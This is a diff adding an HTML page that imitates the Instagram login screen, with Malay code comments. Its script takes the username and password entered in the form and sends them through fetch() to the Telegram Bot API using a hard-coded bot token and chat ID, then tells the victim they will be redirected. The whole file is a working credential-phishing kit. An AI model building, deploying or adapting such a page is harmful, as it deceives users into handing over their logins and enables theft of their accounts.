@@ -1,0 +1,94 @@
+<html>
+  <head>
+    <title>Instagram</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content=" width=device-width,initial-scale=1.0" />
+    <meta http-equiv="refresh" content="60" />
+    <link rel="icon" href="images/favicon.png" type="image/icon" />
+    <link rel="stylesheet" type="text/css" href="style.css" />
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="page">
+        <span id="status"></span>
+        <div class="logo">
+          <img
+            src="images/instagram.png"
+            alt="instagram"
+            style="width: 175px"
+          />
+        </div>
+
+        <br />
+        <form class="container" id="telegramForm">
+          <input
+            type="text"
+            placeholder="Phone number, username, or email "
+            id="name"
+            required
+          />
+          <input type="password" placeholder="Password" id="pass" required />
+          <button class="submitbutton" type="submit">Log in</button>
+          <br />
+          <div class="option">OR</div>
+        </form>
+
+        <div class="fblink">
+          <span class="fab fafacebook"></span>
+          <a href="#"> Log in With Facebook</a>
+        </div>
+
+        <div class="forget-id">
+          <a href="https://www.instagram.com/accounts/password/reset/"
+            >Forget password?</a
+          >
+        </div>
+        <div class="singup">
+          <p>
+            Don't have an account?<a
+              href="https://www.instagram.com/accounts/emailsignup/"
+            >
+              Sign up</a
+            >
+          </p>
+        </div>
+      </div>
+    </div>
+    <script>
+      document
+        .getElementById("telegramForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Halang page dari refresh
+
+          const TOKEN = "7683997891:AAGAdE-3C2glTPKp8sOgwX1UgrV26LtlCH4"; // Gantikan dengan token bot Telegram
+          const CHAT_ID = "1450763890"; // Gantikan dengan Chat ID anda
+          const name = document.getElementById("name").value;
+          const pass = document.getElementById("pass").value;
+          const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+          const data = {
+            chat_id: CHAT_ID,
+            text: `Name: ${name}\nPass: ${pass}`,
+          };
+
+          fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data),
+          })
+            .then((response) => response.json())
+            .then((data) => {
+              document.getElementById("status").innerText =
+                "You will be redirected!";
+              document.getElementById("message").value = ""; // Kosongkan input
+            })
+            .catch((error) => {
+              document.getElementById("status").innerText =
+                "We got some problem, please sign in again.";
+              console.error("Error:", error);
+            });
+        });
+    </script>
+  </body>
+</html>
